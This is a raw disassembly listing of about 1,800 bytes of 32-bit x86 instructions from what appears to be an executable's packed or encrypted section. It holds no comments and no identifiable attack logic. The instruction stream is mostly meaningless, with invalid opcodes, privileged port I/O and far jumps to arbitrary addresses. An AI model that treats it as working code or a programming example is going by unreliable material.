  40d654:	loop   0x40d5ea
  40d656:	mov    ch,0x1f
  40d658:	ins    DWORD PTR es:[edi],dx
  40d659:	icebp  
  40d65a:	mov    edi,0xa8958365
  40d65f:	lods   al,BYTE PTR ds:[esi]
  40d660:	jno    0x40d6c9
  40d662:	ins    DWORD PTR es:[edi],dx
  40d663:	mov    eax,0x76591458
  40d668:	xchg   ecx,eax
  40d669:	pop    edx
  40d66a:	in     eax,0xf0
  40d66c:	jg     0x40d667
  40d66e:	and    eax,0xd5dc1ed5
  40d673:	and    eax,ebx
  40d675:	retf   
  40d676:	mov    ch,0xd9
  40d678:	mov    eax,ds:0xe27c55ed
  40d67d:	fdivr  st(4),st
  40d67f:	shr    DWORD PTR [edi+esi*8-0x15],1
  40d683:	xor    al,0xfb
  40d685:	scas   eax,DWORD PTR es:[edi]
  40d686:	or     BYTE PTR [edx-0x164b48f],bh
  40d68c:	xchg   ebx,eax
  40d68d:	imul   ecx,DWORD PTR [eax-0x5fd8de93],0x24
  40d694:	and    eax,0x54d57b86
  40d699:	sub    ebx,0xc86d71cd
  40d69f:	xchg   ch,dl
  40d6a1:	sub    ebx,esp
  40d6a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6a4:	int    0x3
  40d6a6:	xlat   BYTE PTR ds:[ebx]
  40d6a7:	push   esi
  40d6a8:	repnz xchg esi,eax
  40d6aa:	add    esi,DWORD PTR [ebp-0x40]
  40d6ad:	mov    edi,?
  40d6af:	inc    edi
  40d6b0:	in     eax,0xce
  40d6b2:	push   ecx
  40d6b3:	lods   al,BYTE PTR ds:[esi]
  40d6b4:	je     0x40d71f
  40d6b6:	dec    esp
  40d6b7:	stos   BYTE PTR es:[edi],al
  40d6b8:	xor    bh,BYTE PTR [eax+eax*4-0x2abbc6e2]
  40d6bf:	cmp    cl,BYTE PTR [eax+0x33aed689]
  40d6c5:	addr16 mov bh,0xb4
  40d6c8:	sub    al,0xd7
  40d6ca:	popf   
  40d6cb:	test   DWORD PTR [edi+0x1f],edi
  40d6ce:	not    DWORD PTR [edx-0x1f]
  40d6d1:	cmp    DWORD PTR [esp+eax*8+0x7],ebx
  40d6d5:	mov    esp,0x6debb685
  40d6da:	mov    ch,0xc1
  40d6dc:	jb     0x40d6e7
  40d6de:	dec    esp
  40d6df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6e0:	neg    ch
  40d6e2:	mov    bh,0x1b
  40d6e4:	dec    ebp
  40d6e5:	js     0x40d671
  40d6e7:	test   BYTE PTR [esi-0x49],bl
  40d6ea:	arpl   WORD PTR [eax-0x40a32052],ax
  40d6f0:	outs   dx,DWORD PTR ds:[esi]
  40d6f1:	imul   edi,DWORD PTR [edi],0xffffffb2
  40d6f4:	jl     0x40d6d7
  40d6f6:	mov    eax,ds:0x61a627c8
  40d6fb:	or     edi,ecx
  40d6fd:	pop    ds
  40d6fe:	test   BYTE PTR [ecx+edi*1+0x18],al
  40d702:	mov    bh,0xc5
  40d704:	push   0x83b4d5cc
  40d709:	nop
  40d70a:	nop
  40d70b:	adc    al,0xe3
  40d70d:	inc    edi
  40d70e:	xchg   edi,eax
  40d70f:	add    eax,0xf7622f1a
  40d714:	sar    bh,0xb7
  40d717:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d718:	fst    QWORD PTR [ebx-0x74f4a8eb]
  40d71e:	aad    0x17
  40d720:	lock add bh,cl
  40d723:	push   esi
  40d725:	sar    BYTE PTR [ebp+0x484aaa75],0x78
  40d72c:	fdiv   DWORD PTR [eax]
  40d72e:	into   
  40d72f:	lds    esi,FWORD PTR [edx+0x6e]
  40d732:	push   ebx
  40d733:	data16 sbb cl,BYTE PTR [edi]
  40d736:	lods   al,BYTE PTR ds:[esi]
  40d737:	lock mov eax,ds:0xf175a922
  40d73d:	add    al,0x66
  40d73f:	fstp   QWORD PTR [eax]
  40d741:	push   ebx
  40d742:	pop    edi
  40d743:	or     DWORD PTR [ecx],0xd799d539
  40d749:	nop
  40d74a:	sbb    eax,0x201cafa3
  40d74f:	mov    al,0xbc
  40d751:	xor    BYTE PTR [ebp+0x65],dl
  40d754:	dec    ecx
  40d755:	enter  0x9a0,0x79
  40d759:	sub    ebp,edx
  40d75b:	sub    bh,BYTE PTR [edx-0x3]
  40d75e:	iret   
  40d75f:	mov    cl,0x78
  40d761:	sbb    BYTE PTR [ebp-0x23f2556d],ah
  40d767:	xor    al,0x33
  40d769:	outs   dx,DWORD PTR ds:[esi]
  40d76a:	mov    esp,0xd55406db
  40d76f:	adc    ecx,DWORD PTR [ebp+0x60]
  40d772:	or     al,0xa0
  40d774:	lods   al,BYTE PTR ds:[esi]
  40d775:	mov    esp,0x50ba759e
  40d77a:	call   esp
  40d77c:	dec    edx
  40d77d:	outs   dx,DWORD PTR ds:[esi]
  40d77e:	pop    ss
  40d77f:	add    BYTE PTR [ecx+0x1],dh
  40d782:	mov    ebp,0x49109903
  40d787:	inc    eax
  40d788:	jg     0x40d7a9
  40d78a:	jmp    0xb669:0xed87deee
  40d791:	enter  0xead5,0xed
  40d795:	jnp    0x40d74b
  40d797:	fs push edx
  40d799:	jmp    0x62894d4d
  40d79e:	adc    eax,0x51154e92
  40d7a3:	mov    dh,BYTE PTR [ecx+0x56]
  40d7a6:	(bad)  
  40d7a7:	push   ecx
  40d7a8:	(bad)  [ebx+ebx*2]
  40d7ab:	fs jo  0x40d7ce
  40d7ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7af:	not    ecx
  40d7b1:	das    
  40d7b2:	jo     0x40d77a
  40d7b4:	xchg   edi,eax
  40d7b5:	mov    esp,0x1fba2a2d
  40d7ba:	dec    ecx
  40d7bb:	retf   
  40d7bc:	clc    
  40d7bd:	jae    0x40d819
  40d7bf:	(bad)  
  40d7c0:	scas   eax,DWORD PTR es:[edi]
  40d7c1:	pop    ds
  40d7c2:	mov    eax,0x3787165b
  40d7c7:	dec    eax
  40d7c8:	cmp    eax,DWORD PTR [esi+0x4ef3a4f2]
  40d7ce:	push   ebp
  40d7cf:	sub    eax,0x17e42106
  40d7d4:	js     0x40d7f5
  40d7d6:	and    ebx,0xbeb7cafe
  40d7dc:	mov    bl,0x9d
  40d7de:	(bad)  
  40d7df:	xchg   ebx,eax
  40d7e0:	(bad)  
  40d7e2:	and    BYTE PTR [edi-0x403aa878],ch
  40d7e8:	push   edi
  40d7e9:	and    DWORD PTR ds:0x84ee959b,ebx
  40d7ef:	sbb    ebp,DWORD PTR [edi-0x70]
  40d7f2:	sahf   
  40d7f3:	jp     0x40d866
  40d7f5:	iret   
  40d7f6:	imul   esi,DWORD PTR [ebx+0x5e8976e3],0xfc1d2112
  40d800:	xchg   edi,eax
  40d801:	loopne 0x40d86e
  40d803:	pop    es
  40d804:	out    0x3,eax
  40d806:	sbb    ebx,edi
  40d808:	mov    al,0xc1
  40d80a:	leave  
  40d80b:	cmc    
  40d80c:	inc    ebp
  40d80d:	mov    DWORD PTR [edi-0x7d4ee7dc],ebx
  40d813:	jp     0x40d7c1
  40d815:	jae    0x40d838
  40d817:	gs into 
  40d819:	pop    ds
  40d81a:	test   DWORD PTR [ebx],eax
  40d81c:	out    0x1b,al
  40d81e:	outs   dx,BYTE PTR ds:[esi]
  40d81f:	mov    bl,0x90
  40d821:	or     al,0x9e
  40d823:	shl    DWORD PTR [ecx+0x3ef0c02d],cl
  40d829:	xchg   ecx,eax
  40d82a:	les    esi,FWORD PTR [ebp-0x4e]
  40d82d:	stc    
  40d82e:	jbe    0x40d82c
  40d830:	mov    ds:0x71861c6c,eax
  40d835:	push   0xfffffffb
  40d837:	in     al,0xe0
  40d839:	lock sub bh,dl
  40d83c:	out    0x1f,eax
  40d83e:	daa    
  40d83f:	mov    ebx,DWORD PTR [esi-0x7]
  40d842:	pushf  
  40d843:	ds pop ds
  40d845:	leave  
  40d846:	repz fwait
  40d848:	mov    dl,0x55
  40d84a:	push   ebp
  40d84b:	(bad)  
  40d84c:	jl     0x40d8c2
  40d84e:	add    esi,DWORD PTR [edx-0x78]
  40d851:	pop    ds
  40d852:	push   0x6d
  40d854:	dec    eax
  40d855:	retf   
  40d856:	pushf  
  40d857:	inc    ecx
  40d858:	loop   0x40d7ed
  40d85a:	inc    esi
  40d85b:	fs jb  0x40d86f
  40d85e:	lods   eax,DWORD PTR fs:[esi]
  40d860:	xor    al,0x1a
  40d862:	sbb    DWORD PTR [ebp+ebp*2+0x37562ac],0xffffffc3
  40d86a:	lock enter 0x22cf,0xc9
  40d86f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d870:	jno    0x40d8d4
  40d872:	xor    BYTE PTR [edi],ch
  40d874:	in     al,dx
  40d875:	add    edi,DWORD PTR [edx]
  40d877:	fs xchg esp,eax
  40d879:	pop    ds
  40d87a:	pop    ds
  40d87b:	out    0xaf,eax
  40d87d:	sar    DWORD PTR [ecx+esi*4],0x34
  40d881:	cs push cs
  40d883:	adc    bh,bl
  40d885:	lahf   
  40d886:	sbb    eax,0xeebe86bb
  40d88b:	loopne 0x40d83f
  40d88d:	rcl    al,0x7c
  40d890:	xor    eax,0xee6d271c
  40d895:	and    BYTE PTR [edi+0x28],dl
  40d898:	mov    BYTE PTR [ebx-0x44],bh
  40d89b:	jbe    0x40d8fd
  40d89d:	push   eax
  40d89e:	sub    BYTE PTR [eax-0x71],ch
  40d8a1:	daa    
  40d8a2:	out    dx,eax
  40d8a3:	push   edi
  40d8a4:	jno    0x40d886
  40d8a6:	cs jecxz 0x40d8cc
  40d8a9:	jmp    0x40d8e5
  40d8ab:	jl     0x40d91a
  40d8ad:	cmp    BYTE PTR [ebx-0x51fc9500],0x8b
  40d8b4:	sub    ebp,ebx
  40d8b6:	mov    DWORD PTR [eax+0x75],edx
  40d8b9:	aam    0x5a
  40d8bb:	bound  esi,QWORD PTR [ebp-0x58]
  40d8be:	xchg   ebp,eax
  40d8bf:	xor    DWORD PTR [eax-0x54],eax
  40d8c2:	jecxz  0x40d938
  40d8c4:	lods   al,BYTE PTR ds:[esi]
  40d8c5:	stc    
  40d8c6:	repnz add esi,ebp
  40d8c9:	retf   0x3e4e
  40d8cc:	jne    0x40d94d
  40d8ce:	fimul  WORD PTR [edi-0x5b]
  40d8d1:	les    edx,FWORD PTR [ebp-0x1e927e9b]
  40d8d7:	jne    0x40d8c9
  40d8d9:	mov    al,ds:0xfc967f42
  40d8de:	push   eax
  40d8df:	inc    ecx
  40d8e0:	sbb    BYTE PTR [edi+0x4c],0xd3
  40d8e4:	jno    0x40d87d
  40d8e6:	sbb    eax,0x1026e230
  40d8eb:	aaa    
  40d8ec:	scas   eax,DWORD PTR es:[edi]
  40d8ed:	pop    ds
  40d8ee:	lahf   
  40d8ef:	sbb    al,0x61
  40d8f1:	jbe    0x40d8bf
  40d8f3:	add    BYTE PTR [edx+0xf8d60c],dh
  40d8f9:	adc    eax,DWORD PTR [ebx+0x27]
  40d8fc:	xchg   ebp,eax
  40d8fd:	inc    esp
  40d8fe:	adc    al,0xc1
  40d900:	dec    ecx
  40d901:	(bad)  
  40d903:	or     al,BYTE PTR [ebp-0x6a]
  40d906:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d907:	cmp    dl,BYTE PTR [eax+0x4b]
  40d90a:	aad    0xc1
  40d90c:	push   es
  40d90d:	cmp    dh,BYTE PTR [ebp+0x64]
  40d910:	bound  esp,QWORD PTR [ecx+0x1a3e754c]
  40d916:	fcomp  QWORD PTR [ebx]
  40d918:	(bad)  
  40d919:	arpl   WORD PTR [ecx],si
  40d91b:	jecxz  0x40d98e
  40d91d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d91e:	stc    
  40d91f:	push   edi
  40d920:	xchg   edx,eax
  40d921:	aad    0xff
  40d923:	xchg   ecx,eax
  40d924:	call   0xbc97:0xbba8d42e
  40d92b:	aaa    
  40d92c:	xlat   BYTE PTR ds:[ebx]
  40d92d:	outs   dx,DWORD PTR ds:[esi]
  40d92e:	and    dh,BYTE PTR [esi-0x3b]
  40d931:	sub    al,0xd6
  40d933:	and    ch,bl
  40d935:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d936:	stos   DWORD PTR es:[edi],eax
  40d937:	jg     0x40d8ec
  40d939:	rcl    ecx,1
  40d93b:	test   BYTE PTR [esi],ch
  40d93d:	add    cl,BYTE PTR [ebp+0x77]
  40d940:	lock xor esi,DWORD PTR [ecx+0x16a4b082]
  40d947:	nop
  40d948:	arpl   WORD PTR [eax+0x500c34cf],sp
  40d94e:	jb     0x40d8d8
  40d950:	sbb    ah,BYTE PTR [eax]
  40d952:	pop    es
  40d953:	xor    eax,0xc523e2f8
  40d958:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d959:	jmp    0x7def2e33
  40d95e:	sub    DWORD PTR [ebx+0x76a474cb],esp
  40d964:	mov    ebp,0x8161b470
  40d969:	scas   al,BYTE PTR es:[di]
  40d96b:	xchg   ebp,eax
  40d96c:	leave  
  40d96d:	mov    edx,ebp
  40d96f:	sub    eax,0x63
  40d972:	xchg   dh,bh
  40d974:	pslld  mm4,mm0
  40d977:	cwde   
  40d978:	dec    ecx
  40d979:	sahf   
  40d97a:	jno    0x40d9f4
  40d97c:	retf   
  40d97d:	adc    al,0x82
  40d97f:	aaa    
  40d980:	inc    ecx
  40d981:	stos   BYTE PTR es:[edi],al
  40d982:	into   
  40d983:	adc    dl,BYTE PTR [eax-0x70106615]
  40d989:	and    al,0xd5
  40d98b:	adc    dl,BYTE PTR [edi]
  40d98d:	sub    BYTE PTR ds:0xf437ac77,ah
  40d993:	add    ebp,esp
  40d995:	mov    bh,0x76
  40d997:	adc    BYTE PTR [edx+0x1c],dh
  40d99a:	mov    ebp,0x661c1de2
  40d99f:	pop    edx
  40d9a0:	popa   
  40d9a1:	xor    BYTE PTR ds:0x56761679,ch
  40d9a7:	daa    
  40d9a8:	dec    eax
  40d9a9:	loope  0x40d981
  40d9ab:	dec    esp
  40d9ac:	add    esi,ebx
  40d9ae:	lods   eax,DWORD PTR ds:[esi]
  40d9af:	sbb    DWORD PTR [ebp-0x13],ebp
  40d9b2:	aad    0xc2
  40d9b4:	test   BYTE PTR [ecx],dl
  40d9b6:	cmc    
  40d9b7:	push   ebx
  40d9b8:	cli    
  40d9b9:	and    ch,ch
  40d9bb:	je     0x40d97f
  40d9bd:	jnp    0x40d979
  40d9bf:	mov    dh,0x59
  40d9c1:	xlat   BYTE PTR ds:[ebx]
  40d9c2:	push   0xffffff8c
  40d9c4:	jno    0x40d94a
  40d9c6:	repnz xchg ebp,eax
  40d9c8:	cmc    
  40d9c9:	and    BYTE PTR [ebx+0x5c95ffc9],dl
  40d9cf:	sbb    BYTE PTR gs:[edi],0x4e
  40d9d3:	xor    al,0x99
  40d9d5:	jo     0x40d977
  40d9d7:	aam    0x27
  40d9d9:	mov    edx,0xc8f74ad5
  40d9de:	sbb    BYTE PTR [ecx*8-0x767d1586],al
  40d9e5:	pop    es
  40d9e6:	lahf   
  40d9e7:	jg     0x40da1a
  40d9e9:	jg     0x40d9ff
  40d9eb:	loope  0x40da59
  40d9ed:	cld    
  40d9ee:	adc    al,dl
  40d9f0:	call   0x20f46114
  40d9f5:	mov    esi,0xd03d55bd
  40d9fa:	and    BYTE PTR [ebx-0x80],bl
  40d9fd:	cwde   
  40d9fe:	div    BYTE PTR [ebp-0x24]
  40da01:	mov    cl,0x42
  40da03:	dec    ebp
  40da04:	outs   dx,DWORD PTR ds:[esi]
  40da05:	pop    ebx
  40da06:	(bad)  
  40da07:	in     al,0x7e
  40da09:	icebp  
  40da0a:	(bad)  
  40da0b:	jns    0x40da5c
  40da0d:	jmp    0x19bd:0xd62be2d7
  40da14:	mov    esp,cr1
  40da17:	add    al,0xe
  40da19:	test   esi,esp
  40da1b:	lods   al,BYTE PTR ds:[esi]
  40da1c:	int3   
  40da1d:	mov    ds:0xbfc459d5,al
  40da22:	test   DWORD PTR [ebp+0x20],0x3eae07aa
  40da29:	ret    0xead8
  40da2c:	fimul  DWORD PTR [ebp-0x66aeb7ce]
  40da32:	xchg   edx,eax
  40da33:	inc    ecx
  40da34:	jb     0x40da36
  40da36:	jno    0x40d9ea
  40da38:	jg     0x40daa8
  40da3a:	shr    DWORD PTR [ebp-0x4f],cl
  40da3d:	mov    dh,0x4d
  40da3f:	cmp    DWORD PTR [eax+eiz*1],esp
  40da42:	lea    esp,[edx]
  40da44:	pop    esp
  40da45:	mov    DWORD PTR [ebp-0x28cdc608],esi
  40da4b:	jns    0x40dab9
  40da4d:	xor    eax,0xfffffffd
  40da50:	cmp    al,0x81
  40da52:	int    0x1b
  40da54:	pop    ecx
  40da55:	cmc    
  40da56:	pop    esp
  40da57:	jbe    0x40dac6
  40da59:	rcr    BYTE PTR [edi+0x338ce185],0x4d
  40da60:	rol    BYTE PTR [esi+edi*8],0xd5
  40da64:	jecxz  0x40da2d
  40da66:	(bad)  
  40da67:	sub    DWORD PTR [esi+0x16],edi
  40da6a:	fs jp  0x40da64
  40da6d:	dec    edi
  40da6e:	lods   eax,DWORD PTR ds:[esi]
  40da6f:	mov    dh,0xf6
  40da71:	pop    esi
  40da72:	add    dl,cl
  40da74:	jno    0x40da92
  40da76:	sti    
  40da77:	inc    eax
  40da78:	aam    0xa
  40da7a:	out    0x92,eax
  40da7c:	mov    DWORD PTR [ebp+esi*4+0x56],edi
  40da80:	loope  0x40da91
  40da82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da83:	adc    DWORD PTR [ebx-0x41],0x43
  40da87:	pop    edi
  40da88:	xchg   ecx,eax
  40da89:	xor    eax,0x78f90d04
  40da8e:	push   cs
  40da8f:	leave  
  40da90:	jl     0x40dab4
  40da92:	in     eax,0x2b
  40da94:	fsubp  st(4),st
  40da96:	aam    0x1f
  40da98:	jae    0x40da99
  40da9a:	adc    dl,BYTE PTR [eax-0x7526e07d]
  40daa0:	xchg   ebx,eax
  40daa1:	cs inc esi
  40daa3:	(bad)  
  40daa5:	xor    al,0xdc
  40daa7:	pop    edi
  40daa8:	jmp    0xa78b:0x31a0ee79
  40daaf:	and    ebp,eax
  40dab1:	and    dh,BYTE PTR [ecx+0x38a655af]
  40dab7:	sub    al,0x59
  40dab9:	inc    ecx
  40daba:	icebp  
  40dabb:	(bad)  
  40dabc:	jno    0x40daee
  40dabe:	add    BYTE PTR [eax-0x5f],dh
  40dac1:	mov    esp,DWORD PTR [eax+0x43]
  40dac4:	push   esi
  40dac5:	and    DWORD PTR [esp+esi*2-0x31b8124],ebx
  40dacc:	or     dl,BYTE PTR [eax+0x1d]
  40dacf:	out    dx,eax
  40dad0:	in     al,dx
  40dad1:	pop    edx
  40dad2:	aad    0xa8
  40dad4:	pushf  
  40dad5:	inc    eax
  40dad6:	jnp    0x40da7f
  40dad8:	cld    
  40dad9:	xchg   BYTE PTR [ebp+0x75],ch
  40dadc:	mov    esi,0x3f0154ef
  40dae1:	das    
  40dae2:	xor    BYTE PTR [ecx+0x74],0xd7
  40dae6:	out    dx,al
  40dae7:	ss jp  0x40db13
  40daea:	xchg   esi,eax
  40daeb:	sbb    eax,0x7587c424
  40daf0:	jg     0x40dabd
  40daf2:	sahf   
  40daf3:	jae    0x40dafe
  40daf5:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40daf7:	lds    edi,FWORD PTR [eax-0x8]
  40dafa:	jae    0x40daba
  40dafc:	add    ah,ah
  40dafe:	xor    eax,0x420f77ab
  40db03:	repz mov al,ds:0xe635813c
  40db09:	lahf   
  40db0a:	sub    al,0xde
  40db0c:	mov    ecx,edx
  40db0e:	test   eax,0x8c1772ca
  40db13:	ss xor al,0xa7
  40db16:	push   ecx
  40db17:	cmp    eax,0xd1ca5665
  40db1c:	cmp    eax,DWORD PTR [edx]
  40db1e:	(bad)  
  40db1f:	sub    al,0xf3
  40db21:	pop    eax
  40db22:	cs mov cl,0xb1
  40db25:	cmp    dh,bl
  40db27:	cmp    DWORD PTR [edx],ebx
  40db29:	(bad)  
  40db2a:	aad    0x0
  40db2c:	call   0x3f242ad6
  40db31:	and    BYTE PTR [ebx+0x261db314],ah
  40db37:	sar    BYTE PTR [eax],cl
  40db39:	imul   ebx,ebx,0xffffff90
  40db3c:	adc    al,BYTE PTR [ebx-0x34]
  40db3f:	iret   
  40db40:	int    0x3c
  40db42:	jns    0x40db55
  40db44:	push   eax
  40db45:	mov    al,ds:0xf2971794
  40db4a:	into   
  40db4b:	mov    ebx,0x1e874771
  40db50:	add    BYTE PTR [ebx],bl
  40db52:	lods   eax,DWORD PTR ds:[esi]
  40db53:	adc    eax,0xd76d1f7e
  40db58:	repnz pop edi
  40db5a:	dec    eax
  40db5b:	adc    bh,BYTE PTR [eax+0x675ed52d]
  40db61:	xchg   ebp,eax
  40db62:	dec    ecx
  40db63:	into   
  40db64:	icebp  
  40db65:	mov    ecx,0xdd6b758a
  40db6a:	in     eax,0xc5
  40db6c:	scas   eax,DWORD PTR es:[edi]
  40db6d:	loop   0x40db85
  40db6f:	and    eax,0x8b5f3f8e
  40db74:	jno    0x40dbaa
  40db76:	loope  0x40db4c
  40db78:	clc    
  40db79:	xchg   esp,eax
  40db7a:	retf   0xa975
  40db7d:	arpl   dx,di
  40db7f:	cmp    esp,DWORD PTR [ecx-0x66a287bf]
  40db85:	push   ecx
  40db86:	stos   BYTE PTR es:[edi],al
  40db87:	xor    ah,ch
  40db89:	(bad)  
  40db8a:	aad    0xd5
  40db8c:	fbstp  TBYTE PTR [eax]
  40db8e:	ins    DWORD PTR es:[edi],dx
  40db8f:	mov    ebx,0x75991d2a
  40db94:	out    dx,eax
  40db95:	mov    eax,0xd45bf9c3
  40db9a:	inc    eax
  40db9b:	push   DWORD PTR [ecx-0x7e]
  40db9e:	loopne 0x40dbf0
  40dba0:	mov    eax,ds:0x88b7ffaf
  40dba5:	pop    ds
  40dba6:	shr    DWORD PTR [esi+0x7bca1e84],0x9c
  40dbad:	mov    esp,0xf4dcb2d5
  40dbb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dbb3:	push   eax
  40dbb4:	inc    DWORD PTR ds:0xe53631f
  40dbba:	std    
  40dbbb:	jge    0x40db54
  40dbbd:	cmp    eax,0xaef12c75
  40dbc2:	jle    0x40dbb4
  40dbc4:	jbe    0x40dbbd
  40dbc6:	aad    0x8e
  40dbc8:	cmp    ecx,esi
  40dbca:	mov    dl,0x7b
  40dbcc:	xor    eax,0x73b18072
  40dbd1:	mov    ecx,0x4562aa55
  40dbd6:	mov    ebp,0xd60bfde1
  40dbdb:	xlat   BYTE PTR ds:[bx]
  40dbdd:	xor    BYTE PTR [ebx+0x32170d1],bl
  40dbe3:	test   BYTE PTR [edx+0x51d6fcb4],ch
  40dbe9:	fwait
  40dbea:	lahf   
  40dbeb:	out    0xac,eax
  40dbed:	sbb    esi,edx
  40dbef:	ret    
  40dbf0:	add    ebx,ebx
  40dbf2:	fist   DWORD PTR [esi]
  40dbf4:	xchg   DWORD PTR [edi+edi*4+0x75],edi
  40dbf8:	mov    ebx,0x7ddc37fa
  40dbfd:	out    dx,al
  40dbfe:	mov    esp,0x788b71e3
  40dc03:	or     BYTE PTR [ecx-0x25],ah
  40dc06:	es sbb al,0xf5
  40dc09:	pop    ds
  40dc0a:	xchg   edi,eax
  40dc0b:	xchg   edi,eax
  40dc0c:	hlt    
  40dc0d:	pusha  
  40dc0e:	or     al,0x2e
  40dc10:	inc    esi
  40dc11:	inc    ebx
  40dc12:	fdivr  st,st(1)
  40dc14:	leave  
  40dc15:	out    dx,eax
  40dc16:	icebp  
  40dc17:	mov    ebp,0x1ccbd039
  40dc1c:	xchg   BYTE PTR [edi],bl
  40dc1e:	sahf   
  40dc1f:	mov    edi,0x98fc70dd
  40dc24:	push   ebp
  40dc25:	xchg   ecx,eax
  40dc26:	aad    0x8f
  40dc28:	gs adc eax,0x7c1c816a
  40dc2e:	ds mov ebp,0x6bd60a79
  40dc34:	dec    ebp
  40dc35:	jecxz  0x40dc41
  40dc37:	enter  0xecd4,0xd6
  40dc3b:	aam    0x2d
  40dc3d:	inc    ecx
  40dc3e:	js     0x40dc1b
  40dc40:	rcl    ebx,cl
  40dc42:	mov    ebp,0x95948a33
  40dc47:	jbe    0x40dc4a
  40dc49:	mov    ecx,0x1e2b9950
  40dc4e:	sahf   
  40dc4f:	ins    DWORD PTR es:[edi],dx
  40dc50:	xchg   esp,eax
  40dc51:	fs aad 0xde
  40dc54:	dec    edx
  40dc55:	out    dx,al
  40dc56:	jns    0x40dc1d
  40dc58:	push   0xfffffff4
  40dc5a:	sub    eax,0x5cd296b2
  40dc5f:	aaa    
  40dc60:	and    ah,BYTE PTR [edi+0x6e]
  40dc63:	and    eax,0x47e590fa
  40dc68:	jno    0x40dcad
  40dc6a:	sbb    DWORD PTR [ebx+0x274e3cee],eax
  40dc70:	(bad)  
  40dc71:	pop    ds
  40dc72:	test   BYTE PTR [ecx+0x52],ch
  40dc75:	stos   DWORD PTR es:[edi],eax
  40dc76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc77:	push   ebx
  40dc78:	mov    ds:0x71424e4c,eax
  40dc7d:	fwait
  40dc7e:	mov    bh,0x63
  40dc80:	mov    dh,0xc2
  40dc82:	hlt    
  40dc83:	cmp    al,0x73
  40dc85:	pop    edx
  40dc86:	add    DWORD PTR [ecx-0x3d40e60e],edx
  40dc8c:	cmp    eax,0xcea6be17
  40dc91:	pop    es
  40dc92:	retf   
  40dc93:	outs   dx,BYTE PTR ds:[esi]
  40dc94:	jno    0x40dc60
  40dc96:	div    bl
  40dc98:	pop    esi
  40dc99:	cdq    
  40dc9a:	add    DWORD PTR [edi],eax
  40dc9c:	mov    al,ds:0x71e8e85c
  40dca1:	inc    esp
  40dca2:	sub    eax,0x6eee1992
  40dca7:	mov    DWORD PTR [ecx+ebx*4-0x45],esi
  40dcab:	in     al,0x3b
  40dcad:	cmp    al,0xc1
  40dcaf:	or     DWORD PTR gs:0xfb948340,esp
  40dcb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dcb7:	fidiv  WORD PTR [ecx+0x4dd6a50]
  40dcbd:	jae    0x40dc94
  40dcbf:	leave  
  40dcc0:	dec    edi
  40dcc1:	(bad)  
  40dcc2:	int3   
  40dcc3:	ins    DWORD PTR es:[edi],dx
  40dcc4:	mov    esi,0x2878934b
  40dcc9:	adc    BYTE PTR [esi],dh
  40dccb:	jp     0x40dc4f
  40dccd:	sub    al,0xcd
  40dccf:	mov    ds:0x52d57db6,eax
  40dcd4:	adc    edi,DWORD PTR [ecx-0x3]
  40dcd7:	stos   BYTE PTR es:[edi],al
  40dcd8:	div    DWORD PTR [esi+0x78]
  40dcdb:	xchg   esp,eax
  40dcdc:	cmc    
  40dcdd:	mov    dl,0x8c
  40dcdf:	cmc    
  40dce0:	imul   edx,DWORD PTR [edi-0x27],0xd5cea1eb
  40dce7:	mov    ebx,0x9cdf58cb
  40dcec:	retf   0xc844
  40dcef:	jne    0x40dd10
  40dcf1:	inc    edi
  40dcf2:	out    dx,eax
  40dcf3:	popf   
  40dcf4:	inc    edx
  40dcf5:	es daa 
  40dcf7:	das    
  40dcf8:	jno    0x40dd5e
  40dcfa:	xchg   ebp,eax
  40dcfb:	test   eax,0x90128858
  40dd00:	push   esi
  40dd01:	and    BYTE PTR [ebx-0x47],dh
  40dd04:	jp     0x40dd52
  40dd06:	pop    esi
  40dd07:	sbb    edi,ebp
  40dd09:	adc    ebp,0xffffffa9
  40dd0c:	or     al,0x61
  40dd0e:	clc    
  40dd0f:	int3   
  40dd10:	and    DWORD PTR [ecx-0x24918871],esi
  40dd16:	cmc    
  40dd17:	sbb    DWORD PTR [esp+eax*4+0x17e0a236],edi
  40dd1e:	and    eax,0xd5b25516
  40dd23:	and    ebx,DWORD PTR [edi]
  40dd25:	dec    ebp
  40dd26:	mov    dh,0x93
  40dd28:	idiv   BYTE PTR [ebx]
  40dd2a:	push   esi
  40dd2b:	jne    0x40dd22
  40dd2d:	push   esp
  40dd2e:	(bad)  
  40dd2f:	repnz icebp 
  40dd31:	in     al,dx
  40dd32:	xchg   DWORD PTR fs:[ecx+0x29],esi
  40dd36:	push   0x227cda45
  40dd3b:	ins    BYTE PTR es:[edi],dx
  40dd3c:	inc    ebx
  40dd3d:	and    dl,ch
  40dd3f:	ret    
  40dd40:	sub    ch,BYTE PTR [ecx]
  40dd42:	iret   
  40dd43:	aaa    
  40dd44:	das    
  40dd45:	out    dx,eax
  40dd46:	jecxz  0x40dd03
  40dd48:	pop    edx
  40dd49:	pcmpgtb mm7,QWORD PTR [edx+edi*4-0x56044ab0]
  40dd51:	pop    ss
  40dd52:	jmp    0x50ad0ecb
  40dd57:	fnstenv [edi-0x2c]
  40dd5a:	lods   al,BYTE PTR ds:[esi]
  40dd5b:	in     eax,0x10
  40dd5d:	pusha  
  40dd5e:	arpl   cx,dx
  40dd60:	xchg   ebx,eax
  40dd61:	and    DWORD PTR [edx-0x1fe4caf3],eax
  40dd67:	jb     0x40dd5d
  40dd69:	repnz rcl esp,1
  40dd6c:	inc    ecx
  40dd6d:	jp     0x40dd3c
  40dd6f:	addr16 push edx
  40dd71:	push   ecx
  40dd72:	pop    edi
  40dd73:	pop    ebp
  40dd74:	enter  0xf281,0x9c
  40dd78:	pushf  
  40dd79:	jge    0x40ddd0
  40dd7b:	sub    ebx,0x735dc885
  40dd81:	pop    ds
  40dd82:	test   DWORD PTR [esi+edi*2],eax
  40dd85:	ror    DWORD PTR [ecx+eiz*4+0x29d5c583],cl
  40dd8c:	aas    
  40dd8d:	jnp    0x40dd70
